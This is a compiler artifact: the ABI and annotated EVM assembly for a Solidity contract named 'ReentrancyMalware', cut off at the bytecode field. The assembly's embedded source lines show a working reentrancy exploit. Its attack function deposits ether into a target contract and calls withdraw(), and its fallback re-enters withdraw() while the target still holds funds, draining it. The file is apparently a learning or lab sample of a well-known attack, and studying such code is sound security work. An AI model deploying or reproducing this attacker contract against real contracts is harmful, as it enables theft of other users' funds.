{
	"M/Reentrancy Malware.sol": {
		"ReentrancyMalware": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_target",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "target",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"M/Reentrancy Malware.sol\":0:697  contract ReentrancyMalware {... */\n  mstore(0x40, 0x80)\n    /* \"M/Reentrancy Malware.sol\":61:123  constructor(address _target) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"M/Reentrancy Malware.sol\":109:116  _target */\n  dup1\n    /* \"M/Reentrancy Malware.sol\":100:106  target */\n  0x00\n  0x00\n    /* \"M/Reentrancy Malware.sol\":100:116  target = _target */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"M/Reentrancy Malware.sol\":61:123  constructor(address _target) {... */\n  pop\n    /* \"M/Reentrancy Malware.sol\":0:697  contract ReentrancyMalware {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"M/Reentrancy Malware.sol\":0:697  contract ReentrancyMalware {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"M/Reentrancy Malware.sol\":0:697  contract ReentrancyMalware {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd4b83992\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"M/Reentrancy Malware.sol\":197:198  0 */\n      0x00\n        /* \"M/Reentrancy Malware.sol\":179:185  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Reentrancy Malware.sol\":171:194  address(target).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"M/Reentrancy Malware.sol\":171:198  address(target).balance > 0 */\n      gt\n        /* \"M/Reentrancy Malware.sol\":167:340  if (address(target).balance > 0) {... */\n      iszero\n      tag_9\n      jumpi\n        /* \"M/Reentrancy Malware.sol\":215:227  bool success */\n      0x00\n        /* \"M/Reentrancy Malware.sol\":232:238  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Reentrancy Malware.sol\":232:243  target.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Reentrancy Malware.sol\":244:281  abi.encodeWithSignature(\"withdraw()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"M/Reentrancy Malware.sol\":232:282  target.call(abi.encodeWithSignature(\"withdraw()\")) */\n      mload(0x40)\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_14\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_13)\n    tag_14:\n      0x60\n      swap2\n      pop\n    tag_13:\n      pop\n        /* \"M/Reentrancy Malware.sol\":214:282  (bool success,) = target.call(abi.encodeWithSignature(\"withdraw()\")) */\n      pop\n      swap1\n      pop\n        /* \"M/Reentrancy Malware.sol\":304:311  success */\n      dup1\n        /* \"M/Reentrancy Malware.sol\":296:329  require(success, \"Attack failed\") */\n      tag_15\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_16\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_15:\n        /* \"M/Reentrancy Malware.sol\":200:340  {... */\n      pop\n        /* \"M/Reentrancy Malware.sol\":167:340  if (address(target).balance > 0) {... */\n    tag_9:\n        /* \"M/Reentrancy Malware.sol\":0:697  contract ReentrancyMalware {... */\n      stop\n        /* \"M/Reentrancy Malware.sol\":352:660  function attack() external payable {... */\n    tag_3:\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      stop\n        /* \"M/Reentrancy Malware.sol\":33:54  address public target */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_20\n      jumpi\n      revert(0x00, 0x00)\n    tag_20:\n      pop\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"M/Reentrancy Malware.sol\":352:660  function attack() external payable {... */\n    tag_19:\n        /* \"M/Reentrancy Malware.sol\":398:410  bool success */\n      0x00\n        /* \"M/Reentrancy Malware.sol\":415:421  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Reentrancy Malware.sol\":415:426  target.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Reentrancy Malware.sol\":434:443  msg.value */\n      callvalue\n        /* \"M/Reentrancy Malware.sol\":445:481  abi.encodeWithSignature(\"deposit()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0xd0e30db000000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"M/Reentrancy Malware.sol\":415:482  target.call{value: msg.value}(abi.encodeWithSignature(\"deposit()\")) */\n      mload(0x40)\n      tag_26\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_26:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_29\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_28)\n    tag_29:\n      0x60\n      swap2\n      pop\n    tag_28:\n      pop\n        /* \"M/Reentrancy Malware.sol\":397:482  (bool success,) = target.call{value: msg.value}(abi.encodeWithSignature(\"deposit()\")) */\n      pop\n      swap1\n      pop\n        /* \"M/Reentrancy Malware.sol\":500:507  success */\n      dup1\n        /* \"M/Reentrancy Malware.sol\":492:526  require(success, \"Deposit failed\") */\n      tag_30\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_31\n      swap1\n      tag_32\n      jump\t// in\n    tag_31:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_30:\n        /* \"M/Reentrancy Malware.sol\":550:556  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Reentrancy Malware.sol\":550:561  target.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Reentrancy Malware.sol\":562:599  abi.encodeWithSignature(\"withdraw()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"M/Reentrancy Malware.sol\":550:600  target.call(abi.encodeWithSignature(\"withdraw()\")) */\n      mload(0x40)\n      tag_33\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_33:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_36\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_35)\n    tag_36:\n      0x60\n      swap2\n      pop\n    tag_35:\n      pop\n        /* \"M/Reentrancy Malware.sol\":537:600  (success,) = target.call(abi.encodeWithSignature(\"withdraw()\")) */\n      pop\n      dup1\n      swap2\n      pop\n      pop\n        /* \"M/Reentrancy Malware.sol\":618:625  success */\n      dup1\n        /* \"M/Reentrancy Malware.sol\":610:653  require(success, \"Initial withdraw failed\") */\n      tag_37\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_38\n      swap1\n      tag_39\n      jump\t// in\n    tag_38:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_37:\n        /* \"M/Reentrancy Malware.sol\":387:660  {... */\n      pop\n        /* \"M/Reentrancy Malware.sol\":352:660  function attack() external payable {... */\n      jump\t// out\n        /* \"M/Reentrancy Malware.sol\":33:54  address public target */\n    tag_22:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:105   */\n    tag_40:\n        /* \"#utility.yul\":58:64   */\n      0x00\n        /* \"#utility.yul\":92:97   */\n      dup2\n        /* \"#utility.yul\":86:98   */\n      mload\n        /* \"#utility.yul\":76:98   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:105   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":111:258   */\n    tag_41:\n        /* \"#utility.yul\":212:223   */\n      0x00\n        /* \"#utility.yul\":249:252   */\n      dup2\n        /* \"#utility.yul\":234:252   */\n      swap1\n      pop\n        /* \"#utility.yul\":111:258   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":264:403   */\n    tag_42:\n        /* \"#utility.yul\":353:359   */\n      dup3\n        /* \"#utility.yul\":348:351   */\n      dup2\n        /* \"#utility.yul\":343:346   */\n      dup4\n        /* \"#utility.yul\":337:360   */\n      mcopy\n        /* \"#utility.yul\":394:395   */\n      0x00\n        /* \"#utility.yul\":385:391   */\n      dup4\n        /* \"#utility.yul\":380:383   */\n      dup4\n        /* \"#utility.yul\":376:392   */\n      add\n        /* \"#utility.yul\":369:396   */\n      mstore\n        /* \"#utility.yul\":264:403   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":409:795   */\n    tag_43:\n        /* \"#utility.yul\":513:516   */\n      0x00\n        /* \"#utility.yul\":541:579   */\n      tag_59\n        /* \"#utility.yul\":573:578   */\n      dup3\n        /* \"#utility.yul\":541:579   */\n      tag_40\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":595:683   */\n      tag_60\n        /* \"#utility.yul\":676:682   */\n      dup2\n        /* \"#utility.yul\":671:674   */\n      dup6\n        /* \"#utility.yul\":595:683   */\n      tag_41\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":588:683   */\n      swap4\n      pop\n        /* \"#utility.yul\":692:757   */\n      tag_61\n        /* \"#utility.yul\":750:756   */\n      dup2\n        /* \"#utility.yul\":745:748   */\n      dup6\n        /* \"#utility.yul\":738:742   */\n      0x20\n        /* \"#utility.yul\":731:736   */\n      dup7\n        /* \"#utility.yul\":727:743   */\n      add\n        /* \"#utility.yul\":692:757   */\n      tag_42\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":782:788   */\n      dup1\n        /* \"#utility.yul\":777:780   */\n      dup5\n        /* \"#utility.yul\":773:789   */\n      add\n        /* \"#utility.yul\":766:789   */\n      swap2\n      pop\n        /* \"#utility.yul\":517:795   */\n      pop\n        /* \"#utility.yul\":409:795   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":801:1072   */\n    tag_11:\n        /* \"#utility.yul\":931:934   */\n      0x00\n        /* \"#utility.yul\":953:1046   */\n      tag_63\n        /* \"#utility.yul\":1042:1045   */\n      dup3\n        /* \"#utility.yul\":1033:1039   */\n      dup5\n        /* \"#utility.yul\":953:1046   */\n      tag_43\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":946:1046   */\n      swap2\n      pop\n        /* \"#utility.yul\":1063:1066   */\n      dup2\n        /* \"#utility.yul\":1056:1066   */\n      swap1\n      pop\n        /* \"#utility.yul\":801:1072   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1078:1247   */\n    tag_44:\n        /* \"#utility.yul\":1162:1173   */\n      0x00\n        /* \"#utility.yul\":1196:1202   */\n      dup3\n        /* \"#utility.yul\":1191:1194   */\n      dup3\n        /* \"#utility.yul\":1184:1203   */\n      mstore\n        /* \"#utility.yul\":1236:1240   */\n      0x20\n        /* \"#utility.yul\":1231:1234   */\n      dup3\n        /* \"#utility.yul\":1227:1241   */\n      add\n        /* \"#utility.yul\":1212:1241   */\n      swap1\n      pop\n        /* \"#utility.yul\":1078:1247   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1253:1416   */\n    tag_45:\n        /* \"#utility.yul\":1393:1408   */\n      0x41747461636b206661696c656400000000000000000000000000000000000000\n        /* \"#utility.yul\":1389:1390   */\n      0x00\n        /* \"#utility.yul\":1381:1387   */\n      dup3\n        /* \"#utility.yul\":1377:1391   */\n      add\n        /* \"#utility.yul\":1370:1409   */\n      mstore\n        /* \"#utility.yul\":1253:1416   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1422:1788   */\n    tag_46:\n        /* \"#utility.yul\":1564:1567   */\n      0x00\n        /* \"#utility.yul\":1585:1652   */\n      tag_67\n        /* \"#utility.yul\":1649:1651   */\n      0x0d\n        /* \"#utility.yul\":1644:1647   */\n      dup4\n        /* \"#utility.yul\":1585:1652   */\n      tag_44\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1578:1652   */\n      swap2\n      pop\n        /* \"#utility.yul\":1661:1754   */\n      tag_68\n        /* \"#utility.yul\":1750:1753   */\n      dup3\n        /* \"#utility.yul\":1661:1754   */\n      tag_45\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1779:1781   */\n      0x20\n        /* \"#utility.yul\":1774:1777   */\n      dup3\n        /* \"#utility.yul\":1770:1782   */\n      add\n        /* \"#utility.yul\":1763:1782   */\n      swap1\n      pop\n        /* \"#utility.yul\":1422:1788   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1794:2213   */\n    tag_17:\n        /* \"#utility.yul\":1960:1964   */\n      0x00\n        /* \"#utility.yul\":1998:2000   */\n      0x20\n        /* \"#utility.yul\":1987:1996   */\n      dup3\n        /* \"#utility.yul\":1983:2001   */\n      add\n        /* \"#utility.yul\":1975:2001   */\n      swap1\n      pop\n        /* \"#utility.yul\":2047:2056   */\n      dup2\n        /* \"#utility.yul\":2041:2045   */\n      dup2\n        /* \"#utility.yul\":2037:2057   */\n      sub\n        /* \"#utility.yul\":2033:2034   */\n      0x00\n        /* \"#utility.yul\":2022:2031   */\n      dup4\n        /* \"#utility.yul\":2018:2035   */\n      add\n        /* \"#utility.yul\":2011:2058   */\n      mstore\n        /* \"#utility.yul\":2075:2206   */\n      tag_70\n        /* \"#utility.yul\":2201:2205   */\n      dup2\n        /* \"#utility.yul\":2075:2206   */\n      tag_46\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":2067:2206   */\n      swap1\n      pop\n        /* \"#utility.yul\":1794:2213   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2219:2345   */\n    tag_47:\n        /* \"#utility.yul\":2256:2263   */\n      0x00\n        /* \"#utility.yul\":2296:2338   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2289:2294   */\n      dup3\n        /* \"#utility.yul\":2285:2339   */\n      and\n        /* \"#utility.yul\":2274:2339   */\n      swap1\n      pop\n        /* \"#utility.yul\":2219:2345   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2351:2447   */\n    tag_48:\n        /* \"#utility.yul\":2388:2395   */\n      0x00\n        /* \"#utility.yul\":2417:2441   */\n      tag_73\n        /* \"#utility.yul\":2435:2440   */\n      dup3\n        /* \"#utility.yul\":2417:2441   */\n      tag_47\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":2406:2441   */\n      swap1\n      pop\n        /* \"#utility.yul\":2351:2447   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2453:2571   */\n    tag_49:\n        /* \"#utility.yul\":2540:2564   */\n      tag_75\n        /* \"#utility.yul\":2558:2563   */\n      dup2\n        /* \"#utility.yul\":2540:2564   */\n      tag_48\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":2535:2538   */\n      dup3\n        /* \"#utility.yul\":2528:2565   */\n      mstore\n        /* \"#utility.yul\":2453:2571   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2577:2799   */\n    tag_24:\n        /* \"#utility.yul\":2670:2674   */\n      0x00\n        /* \"#utility.yul\":2708:2710   */\n      0x20\n        /* \"#utility.yul\":2697:2706   */\n      dup3\n        /* \"#utility.yul\":2693:2711   */\n      add\n        /* \"#utility.yul\":2685:2711   */\n      swap1\n      pop\n        /* \"#utility.yul\":2721:2792   */\n      tag_77\n        /* \"#utility.yul\":2789:2790   */\n      0x00\n        /* \"#utility.yul\":2778:2787   */\n      dup4\n        /* \"#utility.yul\":2774:2791   */\n      add\n        /* \"#utility.yul\":2765:2771   */\n      dup5\n        /* \"#utility.yul\":2721:2792   */\n      tag_49\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":2577:2799   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2805:2969   */\n    tag_50:\n        /* \"#utility.yul\":2945:2961   */\n      0x4465706f736974206661696c6564000000000000000000000000000000000000\n        /* \"#utility.yul\":2941:2942   */\n      0x00\n        /* \"#utility.yul\":2933:2939   */\n      dup3\n        /* \"#utility.yul\":2929:2943   */\n      add\n        /* \"#utility.yul\":2922:2962   */\n      mstore\n        /* \"#utility.yul\":2805:2969   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2975:3341   */\n    tag_51:\n        /* \"#utility.yul\":3117:3120   */\n      0x00\n        /* \"#utility.yul\":3138:3205   */\n      tag_80\n        /* \"#utility.yul\":3202:3204   */\n      0x0e\n        /* \"#utility.yul\":3197:3200   */\n      dup4\n        /* \"#utility.yul\":3138:3205   */\n      tag_44\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":3131:3205   */\n      swap2\n      pop\n        /* \"#utility.yul\":3214:3307   */\n      tag_81\n        /* \"#utility.yul\":3303:3306   */\n      dup3\n        /* \"#utility.yul\":3214:3307   */\n      tag_50\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":3332:3334   */\n      0x20\n        /* \"#utility.yul\":3327:3330   */\n      dup3\n        /* \"#utility.yul\":3323:3335   */\n      add\n        /* \"#utility.yul\":3316:3335   */\n      swap1\n      pop\n        /* \"#utility.yul\":2975:3341   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3347:3766   */\n    tag_32:\n        /* \"#utility.yul\":3513:3517   */\n      0x00\n        /* \"#utility.yul\":3551:3553   */\n      0x20\n        /* \"#utility.yul\":3540:3549   */\n      dup3\n        /* \"#utility.yul\":3536:3554   */\n      add\n        /* \"#utility.yul\":3528:3554   */\n      swap1\n      pop\n        /* \"#utility.yul\":3600:3609   */\n      dup2\n        /* \"#utility.yul\":3594:3598   */\n      dup2\n        /* \"#utility.yul\":3590:3610   */\n      sub\n        /* \"#utility.yul\":3586:3587   */\n      0x00\n        /* \"#utility.yul\":3575:3584   */\n      dup4\n        /* \"#utility.yul\":3571:3588   */\n      add\n        /* \"#utility.yul\":3564:3611   */\n      mstore\n        /* \"#utility.yul\":3628:3759   */\n      tag_83\n        /* \"#utility.yul\":3754:3758   */\n      dup2\n        /* \"#utility.yul\":3628:3759   */\n      tag_51\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":3620:3759   */\n      swap1\n      pop\n        /* \"#utility.yul\":3347:3766   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3772:3945   */\n    tag_52:\n        /* \"#utility.yul\":3912:3937   */\n      0x496e697469616c207769746864726177206661696c6564000000000000000000\n        /* \"#utility.yul\":3908:3909   */\n      0x00\n        /* \"#utility.yul\":3900:3906   */\n      dup3\n        /* \"#utility.yul\":3896:3910   */\n      add\n        /* \"#utility.yul\":3889:3938   */\n      mstore\n        /* \"#utility.yul\":3772:3945   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3951:4317   */\n    tag_53:\n        /* \"#utility.yul\":4093:4096   */\n      0x00\n        /* \"#utility.yul\":4114:4181   */\n      tag_86\n        /* \"#utility.yul\":4178:4180   */\n      0x17\n        /* \"#utility.yul\":4173:4176   */\n      dup4\n        /* \"#utility.yul\":4114:4181   */\n      tag_44\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":4107:4181   */\n      swap2\n      pop\n        /* \"#utility.yul\":4190:4283   */\n      tag_87\n        /* \"#utility.yul\":4279:4282   */\n      dup3\n        /* \"#utility.yul\":4190:4283   */\n      tag_52\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":4308:4310   */\n      0x20\n        /* \"#utility.yul\":4303:4306   */\n      dup3\n        /* \"#utility.yul\":4299:4311   */\n      add\n        /* \"#utility.yul\":4292:4311   */\n      swap1\n      pop\n        /* \"#utility.yul\":3951:4317   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4323:4742   */\n    tag_39:\n        /* \"#utility.yul\":4489:4493   */\n      0x00\n        /* \"#utility.yul\":4527:4529   */\n      0x20\n        /* \"#utility.yul\":4516:4525   */\n      dup3\n        /* \"#utility.yul\":4512:4530   */\n      add\n        /* \"#utility.yul\":4504:4530   */\n      swap1\n      pop\n        /* \"#utility.yul\":4576:4585   */\n      dup2\n        /* \"#utility.yul\":4570:4574   */\n      dup2\n        /* \"#utility.yul\":4566:4586   */\n      sub\n        /* \"#utility.yul\":4562:4563   */\n      0x00\n        /* \"#utility.yul\":4551:4560   */\n      dup4\n        /* \"#utility.yul\":4547:4564   */\n      add\n        /* \"#utility.yul\":4540:4587   */\n      mstore\n        /* \"#utility.yul\":4604:4735   */\n      tag_89\n        /* \"#utility.yul\":4730:4734   */\n      dup2\n        /* \"#utility.yul\":4604:4735   */\n      tag_53\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":4596:4735   */\n      swap1\n      pop\n        /* \"#utility.yul\":4323:4742   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122012f88405885251229528625f977e9554d0b81b73ecbb70e0946ca271f152ea2964736f6c634300081d0033\n}\n",
				"bytecode": {
					"linkReferences": {},
